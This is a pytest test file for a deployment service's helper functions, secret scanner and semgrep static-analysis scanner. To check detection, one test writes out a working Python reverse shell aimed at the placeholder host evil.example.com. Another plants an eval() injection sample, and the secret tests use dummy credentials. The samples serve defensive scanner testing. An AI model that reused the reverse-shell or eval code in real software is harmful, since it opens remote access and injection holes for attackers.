"""Tests for deploy pipeline logic.

Covers: secret scanning, repo URL normalization, slugify, tail_text,
and deployment status transitions. Uses mocking to avoid real system
resources (systemd, nginx, postgres).
"""

import json
import re
from pathlib import Path
from unittest.mock import patch, MagicMock

import pytest

from saasclaw_engine.deployments.service import (
    _tail_text,
    _slugify_system_name,
    _normalize_repo_url,
)


class TestTailText:
    """Tests for _tail_text log truncation."""

    def test_short_file_read_fully(self, tmp_path):
        f = tmp_path / "log.txt"
        f.write_text("short log")
        assert _tail_text(f) == "short log"

    def test_long_file_truncated(self, tmp_path):
        f = tmp_path / "log.txt"
        f.write_text("x" * 6000)
        result = _tail_text(f, limit=4000)
        assert result.startswith("...")
        assert len(result) == 4003  # "..." + 4000

    def test_missing_file_returns_empty(self):
        assert _tail_text(Path("/nonexistent/path/log.txt")) == ""

    def test_empty_file(self, tmp_path):
        f = tmp_path / "empty.log"
        f.write_text("")
        assert _tail_text(f) == ""

    def test_custom_limit(self, tmp_path):
        f = tmp_path / "log.txt"
        f.write_text("a" * 100)
        result = _tail_text(f, limit=50)
        assert result.startswith("...")
        assert len(result) == 53

    def test_exact_limit_not_truncated(self, tmp_path):
        f = tmp_path / "log.txt"
        content = "a" * 4000
        f.write_text(content)
        result = _tail_text(f, limit=4000)
        assert result == content
        assert not result.startswith("...")


class TestSlugifySystemName:
    """Tests for _slugify_system_name."""

    def test_lowercase(self):
        assert _slugify_system_name("MyProject") == "myproject"

    def test_spaces_to_hyphens(self):
        assert _slugify_system_name("my project") == "my-project"

    def test_special_chars_removed(self):
        assert _slugify_system_name("my_project.test!") == "my-project-test"

    def test_leading_trailing_hyphens_stripped(self):
        assert _slugify_system_name("--hello--") == "hello"

    def test_consecutive_hyphens_collapsed(self):
        assert _slugify_system_name("my---project") == "my-project"

    def test_empty_returns_app(self):
        assert _slugify_system_name("") == "app"

    def test_only_special_chars_returns_app(self):
        assert _slugify_system_name("@@@") == "app"

    def test_numbers_preserved(self):
        assert _slugify_system_name("project-123") == "project-123"

    def test_already_valid(self):
        assert _slugify_system_name("valid-slug-123") == "valid-slug-123"


class TestNormalizeRepoUrl:
    """Tests for _normalize_repo_url."""

    def test_ssh_to_https(self):
        assert _normalize_repo_url("git@github.com:user/repo.git") == "https://github.com/user/repo"

    def test_https_with_git_suffix(self):
        assert _normalize_repo_url("https://github.com/user/repo.git") == "https://github.com/user/repo"

    def test_https_with_token_stripped(self):
        assert _normalize_repo_url("https://x-access-token:ghp_abc123@github.com/user/repo") == "https://github.com/user/repo"

    def test_trailing_slash_stripped(self):
        assert _normalize_repo_url("https://github.com/user/repo/") == "https://github.com/user/repo"

    def test_empty_returns_empty(self):
        assert _normalize_repo_url("") == ""

    def test_none_like_empty(self):
        assert _normalize_repo_url("") == ""


class TestSecretScanner:
    """Tests for secret scanning patterns against file content."""

    def _scan_content(self, content: str, filename: str = "test.py") -> list:
        """Scan a single string as if it were a file. Reuses the pattern list."""
        from saasclaw_engine.deployments.service import _scan_for_secrets
        tmp_dir = Path("/tmp/test_secret_scan")
        tmp_dir.mkdir(exist_ok=True)
        f = tmp_dir / filename
        f.write_text(content)
        try:
            return _scan_for_secrets(tmp_dir)
        finally:
            f.unlink(missing_ok=True)

    def test_aws_access_key_detected(self):
        findings = self._scan_content("AWS_KEY=AKIAIOSFODNN7EXAMPLE")
        assert any("AWS Access Key" in f for f in findings)

    def test_github_pat_detected(self):
        findings = self._scan_content("token = ghp_aabbccddeeffgghhiijjkkllmmnnooppqqrr")
        assert any("GitHub Personal Access Token" in f for f in findings)

    def test_private_key_detected(self):
        findings = self._scan_content("-----BEGIN RSA PRIVATE KEY-----\nMIIE")
        assert any("Private Key" in f for f in findings)

    def test_db_connection_string_detected(self):
        findings = self._scan_content("DATABASE_URL=postgres://user:password@localhost:5432/db")
        assert any("DB connection string" in f for f in findings)

    def test_openai_key_detected(self):
        findings = self._scan_content("OPENAI_API_KEY=sk-abcdefghijklmnopqrstuvwx")
        assert any("Secret Key" in f for f in findings)

    def test_clean_code_no_findings(self):
        findings = self._scan_content("def hello():\n    return 'world'\n")
        assert len(findings) == 0

    def test_skips_git_directory(self):
        from saasclaw_engine.deployments.service import _scan_for_secrets
        tmp_dir = Path("/tmp/test_secret_git")
        tmp_dir.mkdir(exist_ok=True)
        git_dir = tmp_dir / ".git"
        git_dir.mkdir()
        (git_dir / "config").write_text("token = ghp_faketesttoken1234567890abcdefghijklmnop")
        try:
            findings = _scan_for_secrets(tmp_dir)
            assert len(findings) == 0
        finally:
            import shutil
            shutil.rmtree(tmp_dir, ignore_errors=True)

    def test_skips_node_modules(self):
        from saasclaw_engine.deployments.service import _scan_for_secrets
        tmp_dir = Path("/tmp/test_secret_npm")
        tmp_dir.mkdir(exist_ok=True)
        nm_dir = tmp_dir / "node_modules"
        nm_dir.mkdir()
        (nm_dir / "pkg.json").write_text("api_key = sk-abcdefghijklmnopqrstuvwx")
        try:
            findings = _scan_for_secrets(tmp_dir)
            assert len(findings) == 0
        finally:
            import shutil
            shutil.rmtree(tmp_dir, ignore_errors=True)

    def test_reports_file_path(self):
        findings = self._scan_content("AKIAIOSFODNN7EXAMPLE", "config.py")
        assert any("config.py" in f for f in findings)


class TestSemgrepScanner:
    """Tests for _scan_with_semgrep static analysis integration."""

    def test_clean_code_no_findings(self, tmp_path):
        """Clean Python/JS code should produce zero findings."""
        from saasclaw_engine.deployments.deploy_infra import _scan_with_semgrep
        (tmp_path / "app.py").write_text("def hello():\n    return 'world'\n")
        findings = _scan_with_semgrep(tmp_path)
        # Clean code -> empty list (or 'not installed' advisory)
        assert all('not installed' in f.lower() or 'skipped' in f.lower() for f in findings) or len(findings) == 0

    def test_reverse_shell_detected(self, tmp_path):
        """Reverse shell pattern should be flagged."""
        from saasclaw_engine.deployments.deploy_infra import _scan_with_semgrep
        malicious = (
            "import socket\n"
            "import subprocess\n"
            "import os\n"
            "\n"
            's = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n'
            's.connect(("evil.example.com", 4444))\n'
            'subprocess.Popen(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())\n'
        )
        (tmp_path / "evil.py").write_text(malicious)
        findings = _scan_with_semgrep(tmp_path)
        # If semgrep is installed, should find the pattern
        if not any('not installed' in f.lower() or 'skipped' in f.lower() for f in findings):
            assert len(findings) > 0, 'Expected findings for reverse shell'
            assert any('reverse' in f.lower() or 'shell' in f.lower() for f in findings)

    def test_eval_injection_detected(self, tmp_path):
        """eval() on dynamic input should be flagged."""
        from saasclaw_engine.deployments.deploy_infra import _scan_with_semgrep
        (tmp_path / "inject.py").write_text("user_input = input()\nresult = eval(user_input)\n")
        findings = _scan_with_semgrep(tmp_path)
        if not any('not installed' in f.lower() or 'skipped' in f.lower() for f in findings):
            assert len(findings) > 0, 'Expected findings for eval injection'

    def test_semgrep_returns_list(self, tmp_path):
        """Scanner must always return a list, never raise."""
        from saasclaw_engine.deployments.deploy_infra import _scan_with_semgrep
        (tmp_path / "empty.py").write_text("")
        result = _scan_with_semgrep(tmp_path)
        assert isinstance(result, list)

    def test_rules_file_exists(self):
        """Custom rules YAML must exist and be valid."""
        rules_path = Path(__file__).resolve().parent.parent / "semgrep_rules.yml"
        assert rules_path.exists(), f"semgrep_rules.yml not found at {rules_path}"
        content = rules_path.read_text()
        assert "rules:" in content
        assert "id:" in content
        assert "saasclaw-" in content  # our custom rule prefix
